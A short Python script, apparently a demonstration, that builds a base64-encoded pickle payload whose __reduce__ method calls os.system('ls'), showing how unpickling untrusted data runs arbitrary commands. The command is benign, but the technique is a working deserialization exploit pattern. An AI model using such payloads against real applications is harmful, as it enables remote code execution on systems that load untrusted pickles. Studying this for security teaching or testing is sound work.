from typing import Any
import os
import pickle
import base64


class Dangerous:
    def __reduce__(self) -> str | tuple[Any, ...]:
        return (
            os.system,
            ("ls",)
        )


e = Dangerous()
s = pickle.dumps(e)
print(base64.b64encode(s))
